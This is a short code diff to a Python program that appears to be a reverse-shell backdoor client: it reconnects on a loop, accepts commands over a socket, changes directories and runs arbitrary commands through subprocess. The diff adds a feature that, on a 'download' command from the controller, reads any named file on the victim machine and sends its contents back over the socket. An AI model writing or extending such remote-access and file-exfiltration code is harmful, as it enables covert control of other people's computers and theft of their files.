@@ -20,6 +20,11 @@ def receiver():
             continue
 
 
+def upload_file(file_name):
+    with open(file_name, "rb") as f:
+        sock.send(f.read())
+
+
 def connection():
     while True:
         time.sleep(20)
@@ -41,6 +46,8 @@ def shell():
             pass
         elif command[:3] == "cd ":
             os.chdir(command[3:])
+        elif command[:8] == "download":
+            upload_file(command[9:])
         else:
             execute = subprocess.Popen(
                 command,
